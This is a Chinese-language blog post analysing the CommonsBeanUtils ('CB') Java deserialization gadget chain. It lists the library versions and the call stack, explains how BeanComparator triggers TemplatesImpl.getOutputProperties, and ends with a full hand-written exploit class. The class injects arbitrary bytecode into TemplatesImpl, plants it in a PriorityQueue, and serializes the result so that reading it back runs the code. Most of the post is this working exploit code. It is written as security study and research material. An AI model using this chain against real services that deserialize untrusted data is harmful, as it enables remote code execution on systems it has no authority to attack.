---
layout: post
date: 2025-4-19
title: "CommonsBeanUtils-CB链-分析"
author: "XinYiSleep"
category: Java
---
<h1 id="n2cgu">一.基础信息</h1>

```java
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.9.2</version>
</dependency>
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
堆栈
TemplatesImpl.TransletClassLoader.defineClass()
    TemplatesImpl.defineTransletClasses()
        TemplatesImpl.getTransletInstance()
            TemplatesImpl.newTransformer()
                TemplatesImpl.getOutputProperties()
                    BeanComparator.compare()
                        PriorityQueue.siftDownUsingComparator()
                            PriorityQueue.siftDown()
                                PriorityQueue.heapify()
                                    PriorityQueue.readObject()
```
<h1 id="aUp8M">二.CB链分析</h1>

```
这个链可以说相当简单为什么这么说呢？因为他基本上和cc4特别相似不同的地方也就是中间4步的链不一样，
主要newTransformer调用不同，先学习一个新知识动态设置或获取JavaBean的属性值，
这里非常好玩的点在CommonsBeanUtils中可以执行任意的getter setter方法下面我们看一下案例(代码一和图一)，
知道这个玩法之后，在之前cc4中newTransformer是TrAXFilter构造方法中调用了,这里就从newTransformer开始找，在
TemplatesImpl.getOutputProperties中调用了newTransformer(图二)，模拟构造一下exp(代码二),可以看到就多了一行代码上面的cc4的代码，
链子就结束了吗？不并没有，首先我们的目的是执行到readObject,并且他并没有实现Serializable,巧合的是在commons-beanutils包中BeanComparator.compare方法中达到了我们的想法(图三),
接着再次构造一下exp(代码三),上面我们说过我们的目的是执行到readObject方法中，接着找compare，compare？这不就是cc4中的前半部链吗？没错CB链确实用到了cc4的前半部，简单吧ojbk直接结束。
```
```java
//执行setter方法 会执行任意的setter方法无敌
//,setAdmin(),第二个参数必须是admin第一个字符是小写,并且setAdmin也不能是setADmin(第二个字符不能是大写)。
User user = new User();
PropertyUtils.setProperty(user,"admin","aaaaaaaaa");

//执行getter方法,会执行任意的getter方法无敌,,第二个参数必须是admin第一个字符是小写,
//并且setAdmin也不能是setADmin(第二个字符不能是大写)。
System.out.println(PropertyUtils.getProperty(user,"aDmin"));
```
```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());

Object outputProperties = PropertyUtils.getProperty(templates, "outputProperties");
```
```java
TemplatesImpl templates = new TemplatesImpl();
Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
Field name = templatesClass.getDeclaredField("_name");
name.setAccessible(true);
name.set(templates,"123");

Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
bytecodes.set(templates,new byte[][]{bytes});


Field tfactory = templatesClass.getDeclaredField("_tfactory");
tfactory.setAccessible(true);
tfactory.set(templates,new TransformerFactoryImpl());

//        Object outputProperties = PropertyUtils.getProperty(templates, "outputProperties");
BeanComparator<Object> objectBeanComparator = new BeanComparator<>();
Class<BeanComparator> beanComparatorClass = BeanComparator.class;
Field property = beanComparatorClass.getDeclaredField("property");
property.setAccessible(true);
property.set(objectBeanComparator,"outputProperties");
objectBeanComparator.compare(templates,123456);
```
![](https://xinyisleep.github.io/img/2025/CommonsBeanUtils/1.png)

![](https://xinyisleep.github.io/img/2025/CommonsBeanUtils/2.png)

![](https://xinyisleep.github.io/img/2025/CommonsBeanUtils/3.png)

<h1 id="wM2Ad">三.手写exp</h1>

```
慌什么，exp看完在溜。
```

```java
package com.example.cb;

import com.example.cb.demos.web.User;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

@SpringBootApplication
public class CbApplication {

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"123");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\phpStudy\\test.class"));
        bytecodes.set(templates,new byte[][]{bytes});


        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

//        Object outputProperties = PropertyUtils.getProperty(templates, "outputProperties");
        BeanComparator<Object> objectBeanComparator = new BeanComparator<>();
        Class<BeanComparator> beanComparatorClass = BeanComparator.class;
        Field property = beanComparatorClass.getDeclaredField("property");
        property.setAccessible(true);
        property.set(objectBeanComparator,"outputProperties");

        PriorityQueue priorityQueue = new PriorityQueue<>();
        Class aClass = priorityQueue.getClass();
        Field comparator = aClass.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue,objectBeanComparator);

        Field size = aClass.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,2);

        Field queue = aClass.getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue,new Object[]{templates,templates});


        serialize(priorityQueue);
        unserialize("ser.bin");

//        执行setter方法 会执行任意的settter方法无敌,setAdmin(),第二个参数必须是admin第一个字符是小写,并且setAdmin也不能是setADmin(第二个字符不能是大写)。
//        User user = new User();
//        PropertyUtils.setProperty(user,"admin","aaaaaaaaa");
//
//        执行getter方法,会执行任意的getter方法无敌,,第二个参数必须是admin第一个字符是小写,并且setAdmin也不能是setADmin(第二个字符不能是大写)。
//        System.out.println(PropertyUtils.getProperty(user,"aDmin"));



    }
    public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }

}

```

